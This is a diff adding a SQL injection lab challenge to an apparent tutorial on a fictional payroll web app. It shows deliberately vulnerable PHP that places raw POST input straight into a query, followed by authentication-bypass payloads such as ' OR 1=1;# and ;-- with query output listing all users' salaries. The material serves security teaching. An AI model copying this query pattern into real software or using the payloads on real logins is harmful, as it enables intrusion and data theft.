@@ -386,3 +386,96 @@ Let's take a set of credentials for a spin and see if we can login with the stol
 <img src="../images/login_stolenCreds.png" width="800" height="900">
 
 **Figure 3, Payroll Login with Stolen Credentials**
+
+**Capture a screenshot of a successful login using stolen credentials.**
+
+### Challenge 6: Examine web application source code
+Next, we will walk through the web application to see where we might find SQLi vulnerabilities, starting with the HTTP POST form. The following section of source code creates the POST request when a user attempts to login. Two lines are important for our analysis (HTML tags are removed):
+
+input type="text" name="**user**"
+input type="password" name="**password**"
+
+The above lines define the parameters **user** and **password** in the POST request.
+```
+<?php
+if (!isset($_POST['s'])) {
+?>
+    <center>
+        <form action="" method="post">
+            <h2>Payroll Login</h2>
+            <table style="border-radius: 25px; border: 2px solid black; padding: 20px;">
+                <tr>
+                    <td>User</td>
+                    <td><input type="text" name="user"></td>
+                </tr>
+                <tr>
+                    <td>Password</td>
+                    <td><input type="password" name="password"></td>
+                </tr>
+                <tr>
+                    <td><input type="submit" value="OK" name="s">
+                </tr>
+            </table>
+        </form>
+    </center>
+<?php
+```
+
+Parameters **user** and **password** from the form are used to create variables used in the SQL query. See below:
+
+```
+$user = $_POST['user'];
+
+$pass = $_POST['password'];
+```
+
+Next, the variables **$user** and **$pass** are used to create a SQL query. The query itself is variable $sql, while the IF function uses the $conn and $sql variables to run the query. We are primarily interested in the $sql variable because that is where we find the vulnerability. 
+
+```
+$sql = "select username, salary from users where username = '$user' and password = '$pass'";
+
+if ($conn->multi_query($sql))
+```
+
+Note that user input from the form is passed directly to $sql without sanitization. Everything a user enters in either the user or password fields in the POST form will be passed directly to the SQL statement. So, let's look at how this affects the SQL queries. 
+
+Assume a user enters the credentials **james_kirk** and **kobayashi_maru** for $user and $pass. The query and results are shown below:
+
+```
+mysql> select username, salary from users where username = 'james_kirk' and password = 'kobayashi_maru';
++------------+--------+
+| username   | salary |
++------------+--------+
+| james_kirk |  25000 |
++------------+--------+
+1 row in set (0.00 sec)
+```
+Ok, but what if an attacker entered something unexpected in the $user variable? Could an attacker escape the SQL query written in the source code and craft their own query?
+
+Note that text strings are wrapped with single quotation marks. For example **'james_kirk'** and **'kobayashi_maru'**. A single quotation mark entered in place of a valid username would create a SQL statement such as:
+
+select username, salary from users where username = **'''** and password = **'kobayashi_maru'**;
+
+The odd number of quotation marks creates a syntax error and would force a SQL error. Let's see if we can extend the attack to create a valid SQL query. First, we need to understand what an OR statement would do. The following query include an always true OR clause. Every row of the table users would be evaluated against the OR clause 1=1, and since 1=1 would be true, every row of the table would be returned. Give it a try.
+
+```
+mysql> select username, salary from users where username = 'james_kirk' OR 1=1;
++------------------+--------+
+| username         | salary |
++------------------+--------+
+| james_kirk       |  25000 |
+| mr_spock         |  99000 |
+| leonard_mccoy    |  45000 |
+| nyota_uhura      |  39000 |
+| montgomery_scott |   1250 |
+| hiraku_sulu      |   3500 |
+| pavel_chekov     |   2500 |
++------------------+--------+
+7 rows in set (0.00 sec)
+```
+Now, we make a slight modification to the SQL query by adding the rest of coded query, but we comment out the newly added part using **;#** or **;-- **. 
+
+**select username, salary from users where username = 'james_kirk' OR 1=1;#' and password = 'kobayashi_maru';**
+or
+**select username, salary from users where username = 'james_kirk' OR 1=1;-- ' and password = **'kobayashi_maru'**;**
+
